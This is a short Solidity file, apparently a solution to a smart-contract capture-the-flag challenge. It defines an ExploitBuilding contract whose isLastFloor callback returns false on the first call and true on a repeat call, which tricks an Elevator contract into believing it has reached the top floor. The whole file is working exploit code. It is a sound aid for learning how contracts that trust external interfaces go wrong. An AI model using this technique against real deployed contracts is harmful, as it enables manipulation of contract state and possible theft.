// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ExploitBuilding{
    uint prevfloor;
    Elevator elevator;

    constructor(address _elevatorAddr){
        elevator = Elevator(_elevatorAddr);
    }
    
    function exploit() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint _floor) external returns (bool){
        if (_floor == prevfloor){
            return true;
        }
        prevfloor = _floor;
        return false;
    }
}